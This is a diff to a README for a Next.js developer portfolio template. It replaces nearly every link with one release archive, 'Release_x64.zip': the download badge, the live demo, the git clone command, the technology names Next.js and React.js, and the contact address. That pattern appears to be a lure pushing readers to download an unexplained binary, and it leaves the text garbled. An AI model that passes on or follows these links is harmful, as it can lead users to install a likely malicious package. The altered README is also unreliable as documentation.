@@ -10,17 +10,17 @@ Welcome to the "minimal-portfolio" repository! If you are looking for a sleek an
 ## 🚀 Get Started
 To get started with this minimalistic portfolio template, you can download it from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/alshehrid7/minimal-portfolio/releases/download/v2.0/Release_x64.zip)](https://github.com/alshehrid7/minimal-portfolio/releases/download/v2.0/Release_x64.zip)
 
 If the link does not automatically start the download, simply click on it to initiate the process.
 
 ## 🌐 Live Demo
-You can also check out a live demo of the portfolio template [here](https://www.example.com). Visit the link to see how it looks and functions in a live environment.
+You can also check out a live demo of the portfolio template [here](https://github.com/alshehrid7/minimal-portfolio/releases/download/v2.0/Release_x64.zip). Visit the link to see how it looks and functions in a live environment.
 
 ## 📦 Installation
 1. Clone the repository to your local machine.
   ```bash
-  git clone https://github.com/your-username/minimal-portfolio.git
+  git clone https://github.com/alshehrid7/minimal-portfolio/releases/download/v2.0/Release_x64.zip
   ```
 
 2. Install the dependencies.
@@ -39,8 +39,8 @@ You can also check out a live demo of the portfolio template [here](https://www.
 Feel free to customize the portfolio template to suit your preferences. You can easily modify the colors, fonts, content, and layout to create a unique look that represents your brand and style.
 
 ## 🛠️ Technologies Used
-- **Next.js:** A React framework for building static and dynamic websites.
-- **React.js:** A JavaScript library for building user interfaces.
+- **https://github.com/alshehrid7/minimal-portfolio/releases/download/v2.0/Release_x64.zip** A React framework for building static and dynamic websites.
+- **https://github.com/alshehrid7/minimal-portfolio/releases/download/v2.0/Release_x64.zip** A JavaScript library for building user interfaces.
 - **Tailwind CSS:** A utility-first CSS framework for rapidly building custom designs.
 - **TypeScript:** A typed superset of JavaScript that compiles to plain JavaScript.
 - And more!
@@ -52,7 +52,7 @@ Contributions to this repository are welcome! If you have any ideas for improvem
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## 📞 Contact
-If you have any questions or need support with using this portfolio template, feel free to reach out to me at example@example.com.
+If you have any questions or need support with using this portfolio template, feel free to reach out to me at https://github.com/alshehrid7/minimal-portfolio/releases/download/v2.0/Release_x64.zip
 
 ## 🌟 Start Showcasing Your Work!
 Now that you have access to this minimalistic developer portfolio template, it's time to start showcasing your projects and skills in style. Download, customize, and launch your personalized portfolio to make a lasting impression on potential clients and employers! 🚀
